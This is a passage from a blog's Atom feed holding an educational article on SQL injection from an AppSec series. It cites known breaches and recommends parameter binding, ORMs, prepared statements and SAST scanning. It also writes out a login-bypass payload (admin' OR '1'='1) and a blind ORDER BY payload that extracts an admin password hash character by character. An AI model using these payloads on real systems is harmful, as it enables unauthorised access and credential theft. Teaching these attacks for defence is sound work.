+&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And this is about to come:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CSRF 😈&lt;/li&gt;
+&lt;li&gt;DOS 😈&lt;/li&gt;
+&lt;li&gt;Credential Stuffing 😈&lt;/li&gt;
+&lt;li&gt;Cryptojacking 😈&lt;/li&gt;
+&lt;li&gt;Single-Sign-On 😇&lt;/li&gt;
+&lt;li&gt;Two-Factor Authentication 😇&lt;/li&gt;
+&lt;li&gt;Backups 😇&lt;/li&gt;
+&lt;li&gt;Disk Encryption 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category></entry><entry><title>SQL Injections 😈</title><link href="https://martin-thoma.com/https://medium.com/faun/sql-injections-e8bc9a14c95" rel="alternate"></link><published>2020-10-12T20:00:00+02:00</published><updated>2020-10-12T20:00:00+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-12:/https://medium.com/faun/sql-injections-e8bc9a14c95</id><summary type="html">&lt;p&gt;An SQL injection is an attack on a web system with a database. The attack is done by injecting unexpected commands into parameters. Don&amp;rsquo;t worry, I&amp;rsquo;ll explain that later in detail.&lt;/p&gt;
+&lt;p&gt;After reading this article you will understand what the effect of being vulnerable to SQL injections can …&lt;/p&gt;</summary><content type="html">&lt;p&gt;An SQL injection is an attack on a web system with a database. The attack is done by injecting unexpected commands into parameters. Don&amp;rsquo;t worry, I&amp;rsquo;ll explain that later in detail.&lt;/p&gt;
+&lt;p&gt;After reading this article you will understand what the effect of being vulnerable to SQL injections can be, how to execute SQL injections yourself, and how to prevent them. Let&amp;rsquo;s get started!&lt;/p&gt;
+&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
+&lt;p&gt;SQL Injection attacks are so common nowadays that I just give you this list with some of the biggest known attacks. Please note that SQL injections don&amp;rsquo;t necessarily break anything and thus they might not always be noticed. Most of the time, the attacker steals data.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Injection flaws are part of the &lt;a href="https://owasp.org/www-project-top-ten/"&gt;OWASP Top-10&lt;/a&gt;, meaning it's recognized as a common vulnerability&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;1998&lt;/strong&gt;: Jeff Forristal explains the issue (&lt;a href="https://www.esecurityplanet.com/network-security/how-was-sql-injection-discovered.html"&gt;source&lt;/a&gt;, &lt;a href="http://phrack.org/issues/54/8.html#article"&gt;original&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2009&lt;/strong&gt;: 130 million credit card numbers were stolen from Heartland Payment Systems, 7-Eleven, and others (&lt;a href="http://news.bbc.co.uk/2/hi/americas/8206305.stm"&gt;source&lt;/a&gt;). They claimed &lt;strong&gt;$130 million&lt;/strong&gt; in losses (&lt;a href="https://www.wired.com/2010/03/heartland-sentencing/"&gt;source&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2010&lt;/strong&gt;: 110,000 credit card numbers were stolen from Twin America LLC (&lt;a href="https://www.bankinfosecurity.co.uk/sql-injection-blamed-for-new-breach-a-3195"&gt;source&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2011&lt;/strong&gt;: 50,000 emails and passwords were stolen from Sony (&lt;a href="https://www.wired.com/2011/06/lulzsec-sony-again/"&gt;source&lt;/a&gt;). Sony claims that this created costs of $605,000 USD (&lt;a href="https://www.bbc.com/news/technology-19949624"&gt;source&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2015&lt;/strong&gt;: The personal data of 157,000 people was stolen from TalkTalk (&lt;a href="https://www.theregister.com/2015/11/06/talktalk_claims_157000_customers_data_stolen/"&gt;source&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2016&lt;/strong&gt;: The data of 200,000 voters in Illinois were stolen (&lt;a href="https://www.theregister.com/2016/08/29/fbi_warns_attacks_on_election_systems/"&gt;source&lt;/a&gt;).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2020&lt;/strong&gt;: 8.3 million user names and password hashes were stolen from FreePik (&lt;a href="https://www.zdnet.com/article/free-photos-graphics-site-freepik-discloses-data-breach-impacting-8-3m-users/"&gt;source&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In the worst case, the attacker steals the data and sells it. After that, they corrupt your data in a way that you don&amp;rsquo;t fix it / use the backups.&lt;/p&gt;
+&lt;h2 id="how-are-sql-injection-attacks-executed"&gt;How are SQL injection attacks executed?&lt;/h2&gt;
+&lt;p&gt;Imagine you have a website with a login form. Leaving some important bells and whistles away, something like this happens:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="k"&gt;FROM&lt;/span&gt;   &lt;span class="n"&gt;users&lt;/span&gt;
+&lt;span class="k"&gt;WHERE&lt;/span&gt;  &lt;span class="k"&gt;USER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'**[username]**'&lt;/span&gt;
+       &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'**[password]**'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The attacker can change the username to admin' OR '1'='1 which then gives the query:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="k"&gt;FROM&lt;/span&gt;   &lt;span class="n"&gt;users&lt;/span&gt;
+&lt;span class="k"&gt;WHERE&lt;/span&gt;  &lt;span class="k"&gt;USER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'**admin'&lt;/span&gt; &lt;span class="k"&gt;OR&lt;/span&gt; &lt;span class="s1"&gt;'1'&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'1**'&lt;/span&gt;
+       &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'secret'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This means the query will look for two conditions:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The username is equal to admin&lt;/li&gt;
+&lt;li&gt;OR the password is equal to secret&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Instead, it should have been looking for the combination (username is admin AND the password is equal to secret).&lt;/p&gt;
+&lt;p&gt;What happened here is that the attacker injected SQL into the query. This changed the logic of access control and thus let the attacker login as admin.&lt;/p&gt;
+&lt;h2 id="how-can-i-do-prevent-sql-injections"&gt;How can I do prevent SQL injections?&lt;/h2&gt;
+&lt;p&gt;Input validation and proper escaping are the keys to prevent SQL injections. Preventing SQL injections in this case also helps the poor users who actually wanted to have a ' within their username/password. Never blindly trust user input. Don&amp;rsquo;t use simple string concatenation to build SQL queries with parameters supplied by the user.&lt;/p&gt;
+&lt;p&gt;You might be tempted to think that removing the quotes is enough. This, however, might cause problems within your application. Then you could escape the quotes. This is certainly a good step, but you have to watch out that the escaping isn&amp;rsquo;t broken and that you don&amp;rsquo;t forget anything.&lt;/p&gt;
+&lt;p&gt;Instead of doing this manually, you should use &lt;a href="https://docs.sqlalchemy.org/en/13/core/tutorial.html#bind-parameter-objects"&gt;parameter binding&lt;/a&gt;. In Python, it looks like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy.sql&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;
+
+&lt;span class="c1"&gt;# Create a connection conn&lt;/span&gt;
+&lt;span class="n"&gt;stmt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="sd"&gt;"""SELECT * FROM users&lt;/span&gt;
+&lt;span class="sd"&gt;               WHERE user = :username AND password = :password"""&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stmt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prams&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;"user"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"foo"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"password"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"bar"&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Another way to prevent SQL injections is to use an ORM which does the input sanitation for you:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy.ext.declarative&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;declarative_base&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy.orm&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sessionmaker&lt;/span&gt;
+
+&lt;span class="n"&gt;Base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;declarative_base&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;User&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;__tablename__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"users"&lt;/span&gt;
+    &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"sqlite://"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;Base&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;Session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sessionmaker&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"foo"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"bar"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Here we pass the name and password parameters to the ORM (SQL Alchemy). It takes care of sanitizing the name and the password.&lt;/p&gt;
+&lt;p&gt;The third option is to create a &lt;a href="https://en.wikipedia.org/wiki/Prepared_statement"&gt;prepared statement&lt;/a&gt;. This is also using parameter binding but on the side of the SQL server. I think those are typically harder to use from a developers' perspective.&lt;/p&gt;
+&lt;p&gt;Doing any of those three options is nice, but it is not enough. You want to be sure that you or anybody else doesn&amp;rsquo;t accidentally add code that is vulnerable to SQL injections. For this reason, static application security testing tools (SAST) like &lt;a href="https://pypi.org/project/bandit/"&gt;bandit&lt;/a&gt; check for potential SQL injection vulnerabilities (&lt;a href="https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html"&gt;source&lt;/a&gt;). Insert that in your CI pipeline and stay safe!&lt;/p&gt;
+&lt;p&gt;The principles are the same for any programming language, but you might be interested in seeing more concrete advice in the language that is relevant to you. Have a look at &lt;a href="https://bobby-tables.com/"&gt;bobby-tables.com&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id="creative-sql-injections"&gt;Creative SQL Injections&lt;/h2&gt;
+&lt;p&gt;There are some SQL Injections that are less trivial than the before mentioned examples.&lt;/p&gt;
+&lt;h3 id="simplifying-queries"&gt;Simplifying Queries&lt;/h3&gt;
+&lt;p&gt;An attacker might not know exactly how a query continues. So the attacker
+inserts &lt;code&gt;--&lt;/code&gt; at the end to make the rest of the query a comment.&lt;/p&gt;
+&lt;h3 id="information-gathering"&gt;Information Gathering&lt;/h3&gt;
+&lt;p&gt;An attacker might not know the structure of the database. However, many
+databases have a special table that contains the information. For MySQL,
+MariaDB, and Postgres it is called &lt;code&gt;information_schema&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s possible to restrict access to that table
+(&lt;a href="https://dba.stackexchange.com/a/25668/25983"&gt;example&lt;/a&gt;). You should do it from
+a defense-in-depth perspective.&lt;/p&gt;
+&lt;h3 id="order-by"&gt;Order By&lt;/h3&gt;
+&lt;p&gt;You might be tempted to think that the following SQL query is secure because
+the user input is just in the ORDER BY clause:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;book_title&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;books&lt;/span&gt; &lt;span class="k"&gt;ORDER&lt;/span&gt; &lt;span class="k"&gt;BY&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;where the developer expects &lt;code&gt;user_input&lt;/code&gt; to be either &lt;code&gt;sales&lt;/code&gt; or
+&lt;code&gt;average_review&lt;/code&gt;. However, an attacker could change &lt;code&gt;user_input&lt;/code&gt; to this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;CASE&lt;/span&gt; &lt;span class="k"&gt;WHEN&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;
+     &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="ss"&gt;"admin"&lt;/span&gt;
+         &lt;span class="k"&gt;AND&lt;/span&gt; &lt;span class="k"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="ss"&gt;"a"&lt;/span&gt;
+     &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+     &lt;span class="k"&gt;THEN&lt;/span&gt; &lt;span class="n"&gt;sales&lt;/span&gt;
+     &lt;span class="k"&gt;ELSE&lt;/span&gt; &lt;span class="n"&gt;average_review&lt;/span&gt;
+&lt;span class="k"&gt;END&lt;/span&gt; &lt;span class="k"&gt;ASC&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This way the attacker can get the password hash of the admin user. Character by
+character. Just by looking at how the sorting changes.&lt;/p&gt;
+&lt;h2 id="see-also_1"&gt;See also&lt;/h2&gt;
+&lt;p&gt;I love &lt;a href="https://en.wikipedia.org/wiki/Tom_Scott_(entertainer)"&gt;Tom Scott&lt;/a&gt; and &lt;a href="https://www.youtube.com/user/Computerphile"&gt;Computerphile&lt;/a&gt; and they made a video about the topic!&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/_jKylhJtPmI" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
+&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers 😈 and also techniques of the defenders 😇:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; 😈&lt;/li&gt;
+&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; 😇&lt;/li&gt;
+&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And this is about to come:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CSRF 😈&lt;/li&gt;
+&lt;li&gt;DOS 😈&lt;/li&gt;
+&lt;li&gt;Credential Stuffing 😈&lt;/li&gt;
+&lt;li&gt;Cryptojacking 😈&lt;/li&gt;
+&lt;li&gt;Single-Sign-On 😇&lt;/li&gt;
+&lt;li&gt;Two-Factor Authentication 😇&lt;/li&gt;
+&lt;li&gt;Backups 😇&lt;/li&gt;
+&lt;li&gt;Disk Encryption 😇&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category></entry></feed>
